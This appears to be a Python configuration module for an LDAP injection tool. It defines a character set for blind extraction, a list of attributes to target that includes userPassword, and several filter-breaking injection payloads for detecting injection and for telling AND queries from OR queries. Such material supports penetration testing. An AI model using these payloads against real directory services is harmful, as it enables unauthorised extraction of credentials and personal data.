import string

# Characters tested during blind extraction (ordered to try common chars first)
CHARSET = (
    string.ascii_lowercase
    + string.ascii_uppercase
    + string.digits
    + "!@#$%^&*-_+=<>?/.,;:'\"`~|\\{}"
)

# LDAP attributes checked when --extract is not specified
COMMON_ATTRIBUTES = [
    "uid",
    "cn",
    "sn",
    "mail",
    "givenName",
    "displayName",
    "userPassword",
    "description",
    "telephoneNumber",
    "memberOf",
    "objectClass",
]

# Payloads used to detect raw injection errors
DETECTION_PAYLOADS = [
    "*",
    "(",
    ")",
    "\\",
    "\x00",
    "*)(objectClass=*))(&(objectClass=",
    "*))(|(objectClass=*",
    "*()|%26",
]

# Payloads used to distinguish AND-wrapped vs OR-wrapped queries
LOGIC_PAYLOADS = {
    "AND_true": "*)(objectClass=*))(&(objectClass=",
    "OR_true": "*))(|(objectClass=*",
}

# Tolerance (in bytes) for response-length comparison
LENGTH_TOLERANCE = 20

# Request timeout in seconds
TIMEOUT = 10
